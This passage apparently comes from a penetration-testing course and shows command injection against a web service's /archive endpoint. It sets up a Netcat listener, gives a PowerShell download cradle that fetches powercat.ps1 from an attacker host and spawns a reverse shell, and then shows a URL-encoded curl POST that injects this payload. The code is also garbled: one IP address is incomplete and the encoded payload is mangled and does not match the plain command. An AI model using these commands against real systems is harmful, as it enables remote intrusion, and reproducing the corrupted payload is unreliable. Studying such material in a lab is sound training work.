Listing 172 - Starting Netcat listener on port 4444

With our server powercat.ps1 and Netcat listener in place, we can now use curl in the first terminal to inject the following command. It consists of two parts delimited by a semicolon. The first part uses a PowerShell download cradle to load the Powercat function contained in our server. The second command uses the powercat function to create the reverse shell with the following parameters: -c to specify where, -p for the port, and -e for executing a program.

```
IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.119/powercat.ps1");powercat -c192.168.119.3 -p 4444 -e powershell
```

Listing 173 - Downloading to Powercat and executing a reverse shell

Again, we use curl to encode the command and send it.

```
kali@kali:~$ curl -X POST -data 'archive:get%3BBIEX%20(New-Object%25System.Net.WebClient).DownloadString("http%3A%2F%2F%2F192.168.119%2Fpowercat.ps1%25%2522)%3Bpowercat%25%25-20c%25%25192.168.119.3%25%25-20p%25%254444%25%25-e%25%25powershell' http://192.168.119:8080/archive
```
